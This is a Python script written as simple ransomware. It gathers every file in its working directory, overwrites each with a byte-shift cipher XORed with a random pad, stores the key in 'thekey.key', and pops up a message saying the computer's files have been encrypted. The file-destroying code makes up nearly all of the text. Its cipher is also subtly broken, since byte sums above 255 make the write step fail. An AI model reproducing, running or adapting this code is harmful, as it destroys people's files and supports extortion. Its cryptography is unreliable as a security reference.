import os
import random
import tkinter as tk
from tkinter import messagebox

# Function to display the warning message
def show_warning():
    root = tk.Tk()
    root.withdraw()
    
    messagebox.showwarning(
        "Execution Complete",
        "Your computer has been corrupted. Your files have been encrypted. "
        "Remain calm."
    )

# Function to generate a one-time pad
def generate_one_time_pad(length):
    return bytes([random.randint(0, 255) for _ in range(length)])

# Simple custom block cipher (substitution cipher with shift)
def custom_block_cipher(data, key):
    # Use key length to determine a shift for each byte in the data
    ciphered_data = bytearray()
    for i in range(len(data)):
        shift = key[i % len(key)]  # Repeat the key if shorter than data
        ciphered_data.append(data[i] + shift)  # Simple byte shift cipher
    return bytes(ciphered_data)

# List of all files in the current directory
files = []

# Collect all files in the directory
for file in os.listdir():
    if os.path.isfile(file):
        files.append(file)

print("Files to encrypt:", files)

# Generate a random AES-like key (256-bit)
aes_key = os.urandom(32)

# Generate and save the one-time pad
one_time_pad = b""
for file in files:
    with open(file, "rb") as f:
        contents = f.read()
        one_time_pad += generate_one_time_pad(len(contents))

# Save the AES key and one-time pad to a key file
with open("thekey.key", "wb") as key_file:
    key_file.write(aes_key)
    key_file.write(one_time_pad)

# Encrypt all files using the custom block cipher and the one-time pad
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()

    # Step 1: Encrypt the contents with the custom block cipher (using the AES-like key)
    encrypted_with_cipher = custom_block_cipher(contents, aes_key)

    # Step 2: XOR the AES-encrypted data with a part of the one-time pad
    file_pad = one_time_pad[:len(encrypted_with_cipher)]
    one_time_pad = one_time_pad[len(encrypted_with_cipher):]  # Move to the next part of the pad

    encrypted_contents = bytes([encrypted_with_cipher[i] ^ file_pad[i] for i in range(len(encrypted_with_cipher))])

    # Write the encrypted contents back to the file
    with open(file, "wb") as thefile:
        thefile.write(encrypted_contents)

# Show the warning message to the user
show_warning()
